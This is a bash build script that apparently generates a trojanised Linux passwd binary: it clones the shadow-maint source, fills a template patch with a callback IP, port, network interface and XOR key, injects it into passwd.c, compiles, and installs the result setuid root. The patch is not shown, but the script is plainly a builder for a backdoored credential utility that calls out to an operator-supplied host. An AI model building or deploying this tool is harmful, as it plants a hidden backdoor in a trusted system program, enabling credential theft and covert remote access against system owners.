#!/bin/bash

## Check if Root ##
if [ "$EUID" -ne 0 ]; then 
  echo "Must run as superuser"
  echo "Usage : ./generate {Callback IP} {Port} {Interface} {XOR Key}"
  exit
fi

## Check if Correct Number of Variables ##
if [ $# -ne 4 ]; then
  echo "Illegal number of parameters"
  echo "Usage : ./generate.sh {Callback IP} {Port} {Interface} {XOR Key}"
  exit
fi

## Assign Variables ##
ip=$1
port=$2
interface=$3
key=$4
echo -ne " IP : ${ip}\n Port : ${port}\n Interface : ${interface}\n XOR Key : ${key}\nConfirm these settings [y/n] : "
read pass
if [[ $pass == n ]]; then
    exit 0
fi

## Get dependancies and autogen ##
sudo apt install -y git make autoconf autopoint libtool xsltproc bison byacc python3-pip
sudo pip3 install python-dotenv

git clone https://github.com/shadow-maint/shadow
cd shadow
./autogen.sh --without-selinux
cd ../

## Add Inject Code ##
cp passwdTemplate.patch passwd.patch
sed -i 's/%ip%/'"$ip"'/g' passwd.patch
sed -i 's/%port%/'"$port"'/g' passwd.patch
sed -i 's/%int%/'"$interface"'/g' passwd.patch 
sed -i 's/%key%/'"$key"'/g' passwd.patch 
git restore shadow/src/passwd.c
patch shadow/src/passwd.c passwd.patch 

## Make ##
cd shadow
sudo make all 
cd ../
cp shadow/src/passwd ../
chmod 4755 passwd 